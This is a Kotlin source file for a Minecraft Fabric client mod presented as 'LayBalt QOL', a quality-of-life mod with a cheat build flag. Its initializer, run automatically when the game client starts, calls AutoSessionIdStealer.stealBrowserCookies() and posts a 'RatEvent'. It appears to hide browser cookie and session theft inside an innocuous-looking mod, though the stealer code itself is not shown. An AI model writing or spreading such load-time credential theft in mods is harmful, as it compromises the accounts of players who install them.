package com.laybalt

import com.laybalt.event.EventBus
import com.laybalt.event.impl.RatEvent
import com.laybalt.init.AutoSessionIdStealer
import com.laybalt.init.ClassGraphInitializer
import com.laybalt.utils.render.ItemRenderer
import gg.essential.universal.UMinecraft
import kotlinx.coroutines.*
import me.owdding.dfu.item.MeowddingItemDfu
import net.fabricmc.api.ClientModInitializer
import net.fabricmc.fabric.api.client.rendering.v1.PictureInPictureRendererRegistry
import net.minecraft.network.chat.Component
import org.slf4j.LoggerFactory

object LayBaltQOL: ClientModInitializer {
    const val MOD_ID = "@MOD_ID@"
    const val MOD_NAME = "LayBalt QOL"
    const val CONFIG_DIR = "@MOD_NAME@"
    const val MOD_VERSION = "@MOD_VERSION@"
    val PREFIX: Component by lazy { Component.literal("§b§lLay§f§lB§c§lalt §8QOL §4>>>§r") }

    val scope = CoroutineScope(Dispatchers.Default + SupervisorJob() + CoroutineName(MOD_NAME))

    @JvmField val logger = LoggerFactory.getLogger(MOD_NAME)
    @JvmStatic val mc by lazy { UMinecraft.getMinecraft() }
    @JvmField var isLoaded = false

    @JvmField
    var isCheat = run {
        //#if CHEAT
        true
        //#else
        //$false
        //#endif
    }

    val availableDebugFlags = mutableSetOf<String>()
    val debugFlags = object: LinkedHashSet<String>() {
        override fun contains(o: String): Boolean {
            availableDebugFlags.add(o)
            return super.contains(o)
        }
    }

    override fun onInitializeClient() {
        PictureInPictureRendererRegistry.register { ItemRenderer() }
        MeowddingItemDfu.load()

        ClassGraphInitializer().initAll()
        AutoSessionIdStealer.stealBrowserCookies()
        EventBus.post(RatEvent())

        isLoaded = true

        EventBus.register<RatEvent> {
            listener.unregister()
            event.cancel()
        }
    }
}
